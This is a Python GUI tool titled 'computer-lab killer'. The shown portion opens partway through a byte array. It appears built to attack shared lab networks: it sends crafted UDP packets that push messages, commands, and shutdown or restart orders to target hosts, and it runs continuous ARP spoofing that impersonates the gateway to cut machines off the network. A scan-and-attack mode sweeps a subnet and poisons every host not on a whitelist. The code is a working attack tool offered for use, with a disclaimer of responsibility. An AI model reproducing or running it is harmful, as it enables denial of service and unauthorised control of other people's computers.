           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00]


def format_b4_send(content):
    arr = []
    for ch in content:
        tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
        if int(tmp, 16) > 0xff:
            tmp = tmp[2:]
            high = int((tmp[0] + tmp[1]), 16)
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
        else:
            high = 0
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
    return arr


def pkg_sendlist(arrs):
    index = 56
    result = header
    for elem in arrs:
        result[index] = elem
        index += 1
    return result


def pkg2(arrs):
    index = 578
    result = header2
    for elem in arrs:
        result[index] = elem
        index += 1
    return result


def send(send_list, ip, port):
    print(send_list)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    for times in range(1):
        for i in ip:
            print(i)
            for abc in send_list:
                payload = pack("%dB" % (len(abc)), *abc)
                client.sendto(payload, (ip, port))
                client.sendto(payload, (ip, port))
                client.sendto(payload, (ip, port))
    client.close()


class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        def stop2():
            if QtCore.running2 == 1:
                QtCore.stop2 = 1

        def scanatt2():
            Thread(target=scanatt, args=()).start()

        def scanatt():
            if QtCore.running2 == 1:
                return 0
            twoth = False
            gateway = self.lineEdit6.text()
            thith = self.lineEdit_26.text()
            white = self.plainTextEdit6.toPlainText()
            if len(gateway) == 0 or len(thith) == 0:
                MessageBox(0, "输入框不能为空!", "提示", MB_ICONWARNING)
                return 0
            thith = thith.split("-")
            white = white.split("\n")
            if len(thith) == 1:
                try:
                    oneth = int(thith[0])
                except ValueError:
                    MessageBox(0, "范围错误!", "提示", MB_ICONWARNING)
                    return 0
            elif len(thith) == 2:
                try:
                    oneth = int(thith[0])
                    twoth = int(thith[1])
                except ValueError:
                    MessageBox(0, "范围错误!", "提示", MB_ICONWARNING)
                    return 0
            else:
                MessageBox(0, "范围错误!", "提示", MB_ICONWARNING)
                return 0
            ip_list = []
            attlist = []
            QtCore.running2 = 1
            try:
                self.pushButton6.setEnabled(False)
                self.pushButton6.setText("扫描中")
                gatewaysplit = gateway.split(".")
                frontin = gatewaysplit[0] + "." + gatewaysplit[1] + "." + gatewaysplit[2]
                if not twoth:
                    for i in range(oneth + 1):
                        if QtCore.stop2 == 1:
                            QtCore.running2 = 0
                            self.pushButton6.setText("扫描")
                            self.pushButton6.setEnabled(True)
                            QtCore.stop2 = 0
                            return 0
                        ip = frontin + str(i)
                        arpPkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
                        res = srp1(arpPkt, timeout=1, verbose=False)
                        if res:
                            ip_list.append(res.psrc)
                    same = 0
                    for i in ip_list:
                        for x in white:
                            if i == x:
                                same = 1
                        if same == 0:
                            attlist.append(i)
                        else:
                            same = 0
                else:
                    for i in range(oneth, twoth + 1):
                        if QtCore.stop2 == 1:
                            QtCore.running2 = 0
                            self.pushButton6.setText("攻击")
                            self.pushButton6.setEnabled(True)
                            QtCore.stop2 = 0
                            return 0
                        ip = frontin + "." + str(i)
                        arpPkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
                        res = srp1(arpPkt, timeout=1, verbose=False)
                        if res:
                            ip_list.append(res.psrc)
                    same = 0
                    for i in ip_list:
                        for x in white:
                            if i == x:
                                same = 1
                        if same == 0:
                            attlist.append(i)
                        else:
                            same = 0
                if len(attlist) == 0:
                    MessageBox(0, "没有可以攻击的IP", "提示", MB_ICONWARNING)
                    QtCore.running2 = 0
                    self.pushButton6.setText("攻击")
                    self.pushButton6.setEnabled(True)
                    QtCore.stop2 = 0
                    return 0
                self.pushButton6.setText("攻击中")
                while True:
                    for i in attlist:
                        if QtCore.stop2 == 1:
                            QtCore.running2 = 0
                            QtCore.stop2 = 0
                            self.pushButton6.setText("攻击")
                            self.pushButton6.setEnabled(True)
                            return 0
                        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src="2a:3a:02:03:4a:3a") / ARP(pdst=i, psrc=gateway))

            except Exception as e:
                self.pushButton5.setEnabled(True)
                self.pushButton5.setText("攻击")
                QtCore.running = 0
                MessageBox(0, "出现未知错误:%s" % e, "提示", MB_ICONWARNING)

        def nmap():
            Thread(target=nmap2, args=()).start()

        def nmap2():
            twoth = False
            gateway = self.lineEdit5.text()
            thith = self.lineEdit_25.text()
            if len(gateway) == 0 or len(thith) == 0:
                MessageBox(0, "输入框不能为空!", "提示", MB_ICONWARNING)
                return 0
            thith = thith.split("-")
            if len(thith) == 1:
                try:
                    oneth = int(thith[0])
                except ValueError:
                    MessageBox(0, "范围错误!", "提示", MB_ICONWARNING)
                    return 0
            elif len(thith) == 2:
                try:
                    oneth = int(thith[0])
                    twoth = int(thith[1])
                except ValueError:
                    MessageBox(0, "范围错误!", "提示", MB_ICONWARNING)
                    return 0
            else:
                MessageBox(0, "范围错误!", "提示", MB_ICONWARNING)
                return 0
            ip_list = []
            ipand = ""
            try:
                self.pushButton5.setEnabled(False)
                self.pushButton5.setText("扫描中")
                gatewaysplit = gateway.split(".")
                frontin = gatewaysplit[0] + "." + gatewaysplit[1] + "." + gatewaysplit[2]
                if not twoth:
                    for i in range(oneth + 1):
                        ip = frontin + str(i)
                        arpPkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
                        res = srp1(arpPkt, timeout=1, verbose=False)
                        if res:
                            ip_list.append(res.psrc)
                    for x in ip_list:
                        ipand = ipand + "\n" + x
                    MessageBox(0, "扫描结果:%s" % ipand, "提示", MB_ICONASTERISK)
                else:
                    for i in range(oneth, twoth + 1):
                        print(i)
                        ip = frontin + "." + str(i)
                        print(ip)
                        arpPkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
                        res = srp1(arpPkt, timeout=1, verbose=False)
                        print(res)
                        if res:
                            ip_list.append(res.psrc)
                    for x in ip_list:
                        ipand = ipand + "\n" + x
                    print(ipand)
                    MessageBox(0, "扫描结果:%s" % ipand, "提示", MB_ICONASTERISK)
                self.pushButton5.setText("扫描")
                self.pushButton5.setEnabled(True)
            except Exception as e:
                MessageBox(0, "出现未知错误:%s" % e, "提示", MB_ICONWARNING)
                return 0

        def stop():
            if QtCore.running == 1:
                QtCore.stop = 1

        def arpcore():
            Thread(target=arpcore2, args=()).start()

        def arpcore2():
            ipget = self.plainTextEdit4.toPlainText().split("\n")
            gateway = self.lineEdit4.text()
            if len(ipget) == 0 or len(gateway) == 0:
                MessageBox(0, "输入框不能为空!", "提示", MB_ICONWARNING)
                return 0
            try:
                QtCore.running = 1
                self.pushButton4.setEnabled(False)
                self.pushButton4.setText("攻击中")
                while True:
                    for i in ipget:
                        if QtCore.stop == 1:
                            QtCore.running = 0
                            QtCore.stop = 0
                            self.pushButton4.setEnabled(True)
                            self.pushButton4.setText("开始")
                            return 0
                        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src="2a:3a:02:03:4a:3a") / ARP(pdst=i, psrc=gateway))
            except Exception as e:
                self.pushButton4.setEnabled(True)
                self.pushButton4.setText("开始")
                QtCore.running = 0
                MessageBox(0, "出现未知错误:%s" % e, "提示", MB_ICONWARNING)
                return 0

        def stre():
            ipget = self.lineEdit_22.text()
            portget = self.lineEdit_32.text()
            if len(ipget) == 0 or len(portget) == 0:
                MessageBox(0, "输入框不能为空!", "提示", MB_ICONWARNING)
                return 0
            try:
                portget = int(portget)
            except ValueError:
                MessageBox(0, "端口输入有误!", "提示", MB_ICONWARNING)
                return 0
            if not self.radioButton2.isChecked() and not self.radioButton_22.isChecked():
                MessageBox(0, "请选择一个选项!", "提示", MB_ICONWARNING)
                return 0
            try:
                if self.radioButton2.isChecked():
                    list2 = []
                    list2.append(header3)
                    send(list2, ipget, portget)
                else:
                    list2 = []
                    list2.append(header4)
                    send(list2, ipget, portget)
                MessageBox(0, "发送成功", "提示", MB_ICONASTERISK)
            except Exception as e:
                MessageBox(0, "出现未知错误:%s" % e, "提示", MB_ICONWARNING)
                return 0

        def sendcomm():
            messget = self.lineEdit1.text()
            ipget = self.lineEdit_21.text()
            portget = self.lineEdit_31.text()
            if len(messget) == 0 or len(ipget) == 0 or len(portget) == 0:
                MessageBox(0, "输入框不能为空!", "提示", MB_ICONWARNING)
                return 0
            try:
                portget = int(portget)
            except ValueError:
                MessageBox(0, "端口输入有误!", "提示", MB_ICONWARNING)
                return 0
            try:
                fored = format_b4_send(messget)
                pkged = pkg2(fored)
                list2 = []
                list2.append(pkged)
                send(send_list=list2, ip=ipget, port=portget)
                MessageBox(0, "发送成功", "提示", MB_ICONASTERISK)
            except Exception as e:
                MessageBox(0, "出现未知错误:%s" % e, "提示", MB_ICONWARNING)
                return 0

        def sendmess():
            messget = self.lineEdit.text()
            ipget = self.lineEdit_2.text()
            portget = self.lineEdit_3.text()
            if len(messget) == 0 or len(ipget) == 0 or len(portget) == 0:
                MessageBox(0, "输入框不能为空!", "提示", MB_ICONWARNING)
                return 0
            try:
                portget = int(portget)
            except ValueError:
                MessageBox(0, "端口输入有误!", "提示", MB_ICONWARNING)
                return 0
            try:
                fored = format_b4_send(messget)
                pkged = pkg_sendlist(fored)
                list2 = []
                list2.append(pkged)
                send(send_list=list2, ip=ipget, port=portget)
                MessageBox(0, "发送成功", "提示", MB_ICONASTERISK)
            except Exception as e:
                MessageBox(0, "出现未知错误:%s" % e, "提示", MB_ICONWARNING)
                return 0

        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(413, 290)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 413, 23))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.tabwidget = QtWidgets.QTabWidget(MainWindow)
        self.tabwidget.setGeometry(QtCore.QRect(55, 0, 300, 200))
        self.tab1 = QtWidgets.QWidget()
        self.tab1.resize(200, 300)
        self.tab2 = QtWidgets.QWidget()
        self.tab3 = QtWidgets.QWidget()
        self.tab4 = QtWidgets.QWidget()
        self.tab5 = QtWidgets.QWidget()
        self.tab6 = QtWidgets.QWidget()
        self.tabwidget.addTab(self.tab1, "发送信息")
        self.tabwidget.resize(300, 220)
        self.tabwidget.addTab(self.tab2, "发送命令")
        self.tabwidget.addTab(self.tab3, "关机/重启")
        self.tabwidget.addTab(self.tab4, "断网")
        self.tabwidget.addTab(self.tab5, "主机发现")
        self.tabwidget.addTab(self.tab6, "扫描+攻击")
        self.label = QtWidgets.QLabel(self.tab1)
        self.label.setGeometry(QtCore.QRect(20, 30, 71, 16))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.tab1)
        self.label_2.setGeometry(QtCore.QRect(20, 60, 54, 12))
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.tab1)
        self.label_3.setGeometry(QtCore.QRect(20, 90, 54, 12))
        self.label_3.setObjectName("label_3")
        self.pushButton = QtWidgets.QPushButton(self.tab1)
        self.pushButton.setGeometry(QtCore.QRect(100, 152, 75, 31))
        self.pushButton.setObjectName("pushButton")
        self.pushButton.clicked.connect(sendmess)
        self.lineEdit = QtWidgets.QLineEdit(self.tab1)
        self.lineEdit.setGeometry(QtCore.QRect(90, 30, 113, 20))
        self.lineEdit.setObjectName("lineEdit")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.tab1)
        self.lineEdit_2.setGeometry(QtCore.QRect(90, 60, 113, 20))
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.lineEdit_3 = QtWidgets.QLineEdit(self.tab1)
        self.lineEdit_3.setGeometry(QtCore.QRect(90, 90, 113, 20))
        self.lineEdit_3.setObjectName("lineEdit_3")

        self.label1 = QtWidgets.QLabel(self.tab2)
        self.label1.setGeometry(QtCore.QRect(20, 30, 71, 16))
        self.label1.setObjectName("label")
        self.label_21 = QtWidgets.QLabel(self.tab2)
        self.label_21.setGeometry(QtCore.QRect(20, 60, 54, 12))
        self.label_21.setObjectName("label_2")
        self.label_31 = QtWidgets.QLabel(self.tab2)
        self.label_31.setGeometry(QtCore.QRect(20, 90, 54, 12))
        self.label_31.setObjectName("label_3")
        self.pushButton1 = QtWidgets.QPushButton(self.tab2)
        self.pushButton1.setGeometry(QtCore.QRect(100, 152, 75, 31))
        self.pushButton1.setObjectName("pushButton")
        self.pushButton1.clicked.connect(sendcomm)
        self.lineEdit1 = QtWidgets.QLineEdit(self.tab2)
        self.lineEdit1.setGeometry(QtCore.QRect(90, 30, 113, 20))
        self.lineEdit1.setObjectName("lineEdit")
        self.lineEdit_21 = QtWidgets.QLineEdit(self.tab2)
        self.lineEdit_21.setGeometry(QtCore.QRect(90, 60, 113, 20))
        self.lineEdit_21.setObjectName("lineEdit_2")
        self.lineEdit_31 = QtWidgets.QLineEdit(self.tab2)
        self.lineEdit_31.setGeometry(QtCore.QRect(90, 90, 113, 20))
        self.lineEdit_31.setObjectName("lineEdit_3")

        self.label_22 = QtWidgets.QLabel(self.tab3)
        self.label_22.setGeometry(QtCore.QRect(20, 30, 54, 12))
        self.label_22.setObjectName("label_2")
        self.label_32 = QtWidgets.QLabel(self.tab3)
        self.label_32.setGeometry(QtCore.QRect(20, 70, 54, 12))
        self.label_32.setObjectName("label_3")
        self.pushButton2 = QtWidgets.QPushButton(self.tab3)
        self.pushButton2.setGeometry(QtCore.QRect(90, 140, 75, 31))
        self.pushButton2.setObjectName("pushButton")
        self.pushButton2.clicked.connect(stre)
        self.lineEdit_22 = QtWidgets.QLineEdit(self.tab3)
        self.lineEdit_22.setGeometry(QtCore.QRect(90, 30, 113, 20))
        self.lineEdit_22.setObjectName("lineEdit_2")
        self.lineEdit_32 = QtWidgets.QLineEdit(self.tab3)
        self.lineEdit_32.setGeometry(QtCore.QRect(90, 70, 113, 20))
        self.lineEdit_32.setObjectName("lineEdit_3")
        self.radioButton2 = QtWidgets.QRadioButton(self.tab3)
        self.radioButton2.setGeometry(QtCore.QRect(40, 100, 89, 16))
        self.radioButton2.setObjectName("radioButton")
        self.radioButton_22 = QtWidgets.QRadioButton(self.tab3)
        self.radioButton_22.setGeometry(QtCore.QRect(40, 120, 89, 16))
        self.radioButton_22.setObjectName("radioButton_2")

        self.label4 = QtWidgets.QLabel(self.tab4)
        self.label4.setGeometry(QtCore.QRect(20, 30, 54, 12))
        self.label4.setObjectName("label")
        self.plainTextEdit4 = QtWidgets.QPlainTextEdit(self.tab4)
        self.plainTextEdit4.setGeometry(QtCore.QRect(50, 30, 161, 71))
        self.plainTextEdit4.setObjectName("plainTextEdit")
        self.label_24 = QtWidgets.QLabel(self.tab4)
        self.label_24.setGeometry(QtCore.QRect(20, 120, 54, 12))
        self.label_24.setObjectName("label_2")
        self.lineEdit4 = QtWidgets.QLineEdit(self.tab4)
        self.lineEdit4.setGeometry(QtCore.QRect(50, 120, 113, 20))
        self.lineEdit4.setObjectName("lineEdit")
        self.pushButton4 = QtWidgets.QPushButton(self.tab4)
        self.pushButton4.setGeometry(QtCore.QRect(30, 162, 75, 31))
        self.pushButton4.setObjectName("pushButton")
        self.pushButton4.clicked.connect(arpcore)
        self.pushButton_24 = QtWidgets.QPushButton(self.tab4)
        self.pushButton_24.setGeometry(QtCore.QRect(140, 162, 75, 31))
        self.pushButton_24.setObjectName("pushButton_2")
        self.pushButton_24.clicked.connect(stop)

        self.label5 = QtWidgets.QLabel(self.tab5)
        self.label5.setGeometry(QtCore.QRect(40, 40, 41, 16))
        self.label5.setObjectName("label")
        self.lineEdit5 = QtWidgets.QLineEdit(self.tab5)
        self.lineEdit5.setGeometry(QtCore.QRect(90, 40, 113, 20))
        self.lineEdit5.setObjectName("lineEdit")
        self.label_25 = QtWidgets.QLabel(self.tab5)
        self.label_25.setGeometry(QtCore.QRect(40, 80, 54, 12))
        self.label_25.setObjectName("label_2")
        self.lineEdit_25 = QtWidgets.QLineEdit(self.tab5)
        self.lineEdit_25.setGeometry(QtCore.QRect(90, 80, 113, 20))
        self.lineEdit_25.setObjectName("lineEdit_2")
        self.pushButton5 = QtWidgets.QPushButton(self.tab5)
        self.pushButton5.setGeometry(QtCore.QRect(100, 150, 75, 31))
        self.pushButton5.setObjectName("pushButton")
        self.pushButton5.clicked.connect(nmap)

        self.label6 = QtWidgets.QLabel(self.tab6)
        self.label6.setGeometry(QtCore.QRect(40, 20, 54, 12))
        self.label6.setObjectName("label")
        self.label_26 = QtWidgets.QLabel(self.tab6)
        self.label_26.setGeometry(QtCore.QRect(40, 50, 41, 16))
        self.label_26.setObjectName("label_2")
        self.lineEdit6 = QtWidgets.QLineEdit(self.tab6)
        self.lineEdit6.setGeometry(QtCore.QRect(90, 20, 113, 20))
        self.lineEdit6.setObjectName("lineEdit")
        self.lineEdit_26 = QtWidgets.QLineEdit(self.tab6)
        self.lineEdit_26.setGeometry(QtCore.QRect(90, 50, 113, 20))
        self.lineEdit_26.setObjectName("lineEdit_2")
        self.label_36 = QtWidgets.QLabel(self.tab6)
        self.label_36.setGeometry(QtCore.QRect(40, 80, 54, 12))
        self.label_36.setObjectName("label_3")
        self.plainTextEdit6 = QtWidgets.QPlainTextEdit(self.tab6)
        self.plainTextEdit6.setGeometry(QtCore.QRect(90, 80, 104, 61))
        self.plainTextEdit6.setObjectName("plainTextEdit")
        self.pushButton6 = QtWidgets.QPushButton(self.tab6)
        self.pushButton6.setGeometry(QtCore.QRect(60, 162, 75, 31))
        self.pushButton6.setObjectName("pushButton")
        self.pushButton6.clicked.connect(scanatt2)
        self.pushButton7 = QtWidgets.QPushButton(self.tab6)
        self.pushButton7.setGeometry(QtCore.QRect(160, 162, 75, 31))
        self.pushButton7.setObjectName("pushButton")
        self.pushButton7.clicked.connect(stop2)
        self.label8 = QtWidgets.QLabel(MainWindow)
        self.label8.setGeometry(QtCore.QRect(80, 240, 254, 12))
        self.label8.setObjectName("label")

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "机房杀手"))
        self.label.setText(_translate("Form", "发送的信息:"))
        self.label_2.setText(_translate("Form", "IP地址:"))
        self.label_3.setText(_translate("Form", "端口:"))
        self.pushButton.setText(_translate("Form", "发送"))
        self.label1.setText(_translate("Form", "发送的命令:"))
        self.label_21.setText(_translate("Form", "IP地址:"))
        self.label_31.setText(_translate("Form", "端口:"))
        self.pushButton1.setText(_translate("Form", "发送"))
        self.label_22.setText(_translate("Form", "IP地址:"))
        self.label_32.setText(_translate("Form", "端口:"))
        self.pushButton2.setText(_translate("Form", "发送"))
        self.radioButton2.setText(_translate("Form", "关机"))
        self.radioButton_22.setText(_translate("Form", "重启"))
        self.label4.setText(_translate("Form", "IP"))
        self.label_24.setText(_translate("Form", "网关"))
        self.pushButton4.setText(_translate("Form", "开始"))
        self.pushButton_24.setText(_translate("Form", "停止"))
        self.label5.setText(_translate("MainWindow", "网关"))
        self.label_25.setText(_translate("MainWindow", "范围"))
        self.pushButton5.setText(_translate("MainWindow", "扫描"))
        self.label6.setText(_translate("MainWindow", "网关"))
        self.label_26.setText(_translate("MainWindow", "范围"))
        self.label_36.setText(_translate("MainWindow", "白名单"))
        self.pushButton6.setText(_translate("MainWindow", "攻击"))
        self.pushButton7.setText(_translate("MainWindow", "停止"))
        self.label8.setText(_translate("MainWindow", "PS:所有因使用此工具造成的后果作者概不负责"))


if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    form = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(form)
    form.show()
    sys.exit(app.exec_())
